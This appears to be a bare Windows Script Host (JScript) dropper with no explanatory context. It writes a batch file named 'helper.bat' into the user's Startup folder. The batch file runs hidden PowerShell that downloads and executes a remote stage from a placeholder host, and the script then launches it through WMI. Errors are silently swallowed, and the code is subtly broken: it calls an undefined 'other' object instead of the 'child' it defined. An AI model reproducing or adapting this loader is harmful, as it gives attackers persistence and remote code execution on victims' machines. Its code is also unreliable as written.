var host = WScript.CreateObject("WScript.Shell");
var fs = new ActiveXObject("Scripting.FileSystemObject");
var startup = host.SpecialFolders("Startup");
var path = fs.BuildPath(startup, "helper.bat");
var body = ["@echo off", "start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/stage')"].join("\r\n");
try {
  var output = fs.CreateTextFile(path, true, false);
  output.Write(body + "\r\n");
  output.Close();
  var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
  var child = wmi.Get("Win32_Process");
  other.Create('"' + path + '"', null, null, null);
} catch (e) {}
